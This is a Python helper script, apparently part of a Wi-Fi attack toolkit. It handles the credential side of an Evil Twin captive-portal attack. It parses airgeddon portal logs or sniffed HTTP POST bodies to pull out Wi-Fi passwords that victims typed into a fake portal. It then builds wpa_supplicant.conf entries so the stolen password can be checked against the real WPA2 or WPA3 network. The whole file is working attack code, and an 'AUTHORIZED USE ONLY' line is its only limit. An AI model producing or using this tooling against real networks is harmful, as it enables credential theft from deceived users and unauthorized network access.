#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Airsniffer - Captive portal credential capture & verification helper
====================================================================

In an Evil Twin captive-portal attack, the victim submits the Wi-Fi password
through the portal. For WPA2 the engine can verify that password offline against
a captured 4-way handshake. For a **WPA3-only** target there is no offline check
(SAE defeats it), so the captured password must be verified by *actively trying
to associate* to the real network - the "active dictionary" path.

This helper handles the capture + verification-prep side:

  1. extract submitted password candidate(s) from a capture - either an
     airgeddon captive-portal log, or a sniffed plaintext HTTP POST body
     (e.g. ``key1=abcdefgh&submitBtn=Submit`` captured with Bettercap on an
     open rogue AP), URL-decoding form fields;
  2. emit a ready ``wpa_supplicant.conf`` for the target SSID so the bash plugin
     can attempt a live association to confirm the password.

This helper only parses text and writes a config; it never associates or sends
traffic. The live verification is done by the plugin, behind an auth gate.

AUTHORIZED USE ONLY.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from urllib.parse import unquote_plus
from typing import Optional

# Form-field names commonly used by captive portals for the Wi-Fi password.
PASSWORD_FIELD_HINTS = (
    "key1", "key", "password", "passwd", "pass", "pwd", "psk",
    "wifikey", "wifi_password", "wifipassword", "wpakey", "wpa_key",
    "networkkey", "network_key", "pre_shared_key", "preshared", "sharedkey",
)

# Fields that are never the password (submit buttons, tokens, etc.).
FIELD_DENYLIST = ("submit", "submitbtn", "btn", "token", "csrf", "lang",
                  "language", "redirect", "ssid", "bssid")


def _looks_like_password_field(name: str) -> bool:
    low = name.lower()
    if any(d in low for d in FIELD_DENYLIST):
        return False
    return any(h in low for h in PASSWORD_FIELD_HINTS)


def extract_from_post(text: str) -> list[dict]:
    """Pull form fields from any ``a=b&c=d`` runs in the text (HTTP POST body),
    URL-decoding values. Returns candidate password fields in order seen."""
    out: list[dict] = []
    seen: set[str] = set()
    # Find urlencoded form-field pairs anywhere in the blob.
    for m in re.finditer(r"([A-Za-z0-9_\-\.\[\]]+)=([^&\s]*)", text):
        name, raw = m.group(1), m.group(2)
        value = unquote_plus(raw)
        if not value:
            continue
        if _looks_like_password_field(name):
            key = (name, value)
            if key in seen:
                continue
            seen.add(key)
            out.append({"field": name, "value": value, "source": "post"})
    return out


def extract_from_portal_log(text: str) -> list[dict]:
    """airgeddon's captive-portal log stores the captured password; pull any
    line that presents a standalone candidate (short, printable, no spaces),
    skipping obvious log furniture."""
    out: list[dict] = []
    seen: set[str] = set()
    for line in text.splitlines():
        s = line.strip()
        if not s or s.startswith(("#", "=", "-", "[")):
            continue
        # A WPA PSK is 8..63 printable chars; captive-portal logs usually have
        # the bare candidate on its own line.
        if 8 <= len(s) <= 63 and " " not in s and "\t" not in s:
            if s in seen:
                continue
            seen.add(s)
            out.append({"field": "portal-log", "value": s, "source": "log"})
    return out


def dedup_values(cands: list[dict]) -> list[str]:
    out: list[str] = []
    for c in cands:
        if c["value"] not in out:
            out.append(c["value"])
    return out


def wpa_supplicant_conf(ssid: str, password: str, wpa3: bool) -> str:
    """Build a minimal wpa_supplicant.conf entry to test one password. For a
    WPA3-only target we request SAE + mandatory PMF; otherwise WPA2-PSK."""
    if wpa3:
        return (
            "ctrl_interface=/run/wpa_supplicant\n"
            "network={\n"
            '    ssid="%s"\n'
            "    key_mgmt=SAE\n"
            "    ieee80211w=2\n"
            '    psk="%s"\n'
            "}\n" % (ssid, password)
        )
    return (
        "ctrl_interface=/run/wpa_supplicant\n"
        "network={\n"
        '    ssid="%s"\n'
        "    key_mgmt=WPA-PSK\n"
        '    psk="%s"\n'
        "}\n" % (ssid, password)
    )


def build(text: str, ssid: str, wpa3: bool) -> dict:
    cands = extract_from_post(text)
    if not cands:
        cands = extract_from_portal_log(text)
    values = dedup_values(cands)
    return {
        "ssid": ssid,
        "wpa3": wpa3,
        "candidate_count": len(values),
        "candidates": cands,
        "unique_passwords": values,
        "verify_method": ("live association (SAE) - offline crack impossible"
                          if wpa3 else "offline against handshake, or live"),
        "wpa_supplicant_confs": {
            v: wpa_supplicant_conf(ssid, v, wpa3) for v in values
        },
    }


def print_text(result: dict) -> None:
    print("=" * 62)
    print(" Airsniffer - Captive portal credential capture")
    print("=" * 62)
    print(" Target SSID: %s   (%s)"
          % (result["ssid"], "WPA3-only" if result["wpa3"] else "WPA2"))
    print(" Verify via : %s" % result["verify_method"])
    print("-" * 62)
    if not result["unique_passwords"]:
        print(" No password candidates found in the capture.")
        print(" Point this at the captive-portal log or a sniffed HTTP POST")
        print(" body (e.g. key1=...&submitBtn=Submit).")
        print("-" * 62)
        return
    print(" Captured password candidate(s):")
    for i, v in enumerate(result["unique_passwords"], 1):
        print("  %2d. %s" % (i, v))
    print("-" * 62)
    if result["wpa3"]:
        print(" WPA3-only: verify by attempting a live association with the")
        print(" generated wpa_supplicant.conf (the plugin does this, gated).")
    else:
        print(" WPA2: verify offline against the captured handshake, or live.")


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Extract captured captive-portal password candidates and "
                    "build a wpa_supplicant.conf for live verification.")
    p.add_argument("capture", nargs="?", default="-",
                   help="portal log or HTTP POST capture (default: stdin)")
    p.add_argument("--ssid", required=True, help="target network SSID")
    p.add_argument("--wpa3", action="store_true",
                   help="target is WPA3-only (verify via live SAE association)")
    p.add_argument("--emit-conf", metavar="PASSWORD",
                   help="print only the wpa_supplicant.conf for this password")
    p.add_argument("--json", action="store_true", help="emit JSON")
    return p.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(sys.argv[1:] if argv is None else argv)

    # Direct conf emission does not need a capture file.
    if args.emit_conf is not None:
        sys.stdout.write(wpa_supplicant_conf(args.ssid, args.emit_conf,
                                              args.wpa3))
        return 0

    try:
        if args.capture == "-":
            text = sys.stdin.read()
        else:
            with open(args.capture, "r", encoding="utf-8",
                      errors="replace") as fh:
                text = fh.read()
    except OSError as exc:
        print("[!] could not read capture: %s" % exc, file=sys.stderr)
        return 2

    result = build(text, args.ssid, args.wpa3)
    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print_text(result)
    return 0


if __name__ == "__main__":
    sys.exit(main())
